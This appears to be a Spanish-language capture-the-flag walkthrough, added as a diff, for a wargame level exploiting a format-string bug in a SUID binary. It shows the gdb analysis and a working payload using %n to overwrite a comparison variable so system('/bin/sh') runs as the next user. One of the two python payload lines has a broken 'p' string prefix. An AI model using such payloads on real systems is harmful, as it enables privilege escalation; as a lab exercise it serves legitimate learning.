@@ -1,0 +1,88 @@
+1.- Usando gdb veremos que funciones tenemos
+  (gdb) info functions
+    [...]
+    0x080484a4  v
+    0x0804851a  main
+    [...]
+
+2.- Desensamblamos main y vemos que lo único que hace es llamar a la función v
+  (gdb) disassemble main
+    [...]
+    0x08048520 <+6>:	call   0x80484a4 <v>
+    [...]
+
+3.- Desensamblamos v
+  (gdb) disassemble v
+
+4.- Vemos que el vector de ataque de gets() que hemos utilizado en anteriores ejercicios en principio,
+    no está disponible porque se está usando fgets()
+    [...]
+    0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
+    [...]
+
+5.- Vemos que se está usando printf() con un sólo argumento que es un buffer al estilo printf(buff);
+    [...]
+    0x080484cc <+40>:	lea    -0x208(%ebp),%eax
+    0x080484d2 <+46>:	mov    %eax,(%esp)
+    0x080484d5 <+49>:	call   0x8048390 <printf@plt>
+    [...]
+
+6.- El printf() será nustro vector de ataque
+
+7.- Podemos insertar una cadena formateada para inspeccionar el stack
+
+8.- Ejecutamos el binario ./level3 y en el momento de ingresar el input insertaremos
+  AAAA %x %x %x %x %x %x 
+  AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825
+
+9.- Vemos que es vulnerable a overflows sobre el printf() y que nuestro valor se almacena en la 
+    4ª posición de la pila que coresponde al valor 41414141
+
+10.- Mas adelande, en la función v(), vemos que eax adopta el valor de la dirección 0x804988c
+    para luego hacer una comparación entre eax y el valor 0x40 
+    [...]
+    0x080484da <+54>:	mov    0x804988c,%eax
+    0x080484df <+59>:	cmp    $0x40,%eax
+    0x080484e2 <+62>:	jne    0x8048518 <v+116>
+    [...]
+
+11.- En caso de no cumplirse salta al final pero en caso de que eax valga 0x40 ejecuta una parte de 
+    código que contiene una llamada a system y como parámetro "bin/sh"
+    [...]
+    0x0804850c <+104>:	movl   $0x804860d,(%esp)
+    0x08048513 <+111>:	call   0x80483c0 <system@plt>
+    [...]
+    (gdb) x/s 0x804860d
+    0x804860d:	"/bin/sh"
+
+12.- El plan es insertar un valor 0x40 (64 en decimal) en la dirección que usa eax para la comparación
+    para que se ejecute el sytem("/bin/sh") como usuario level4 ya que el binario tiene permisos SUID de level4
+
+13.- Vamos a ello
+
+14.- La funcón printf tiene una funcionalidad que es la de almacenar algún tipo de valor en una variable. 
+    Tiene una flag que es %n que nos permite obtener el valor numérico de los caracteres imprimidos hasta
+    el %n y almacenarlo en una variable. En esté caso se almacena el valor numérico de x es 4.
+    [...]
+    printf("HOLA%n\n", &x);
+    printf("x= %d\n", x);
+    [...]
+    
+15.- También, la función printf podemos alterar la posicion de una flag con [num]$
+    [...]
+    printf("%2$d es el segundo argumento, %1$d es el primero\n", 10, 20);
+    [...]
+    Esto imprimirá: `20 es el segundo argumento, 10 es el primero`
+
+16.- Usaremos el padding de una flag para insertar un numero arbitrario de caracteres
+
+17.- Vamos a montar la cadena formateada
+    1.- La dirección de donde obtiene el valor eax en little endian: \x8c\x98\x04\x08
+    2.- Asignaremos 60 caracteres medio de padding de una flag: %60d (60 characteres + 4 address = 64 = 0x40)
+    3.- Por medio de $4 y %n asignaremos a la posición 4 de los parametros el valor: %4$n 
+    [...]
+    python -c 'print "\x8c\x98\x04\x08" + "%60d%4$n"' > /tmp/payload
+    python -c 'import sys; sys.stdout.write(p"\x8c\x98\x04\x08" + p"%60d%4$n")' > /tmp/payload
+
+18.- Se lo pasaremos al binario por el imput con cat
+    cat /tmp/payload - | ./level3
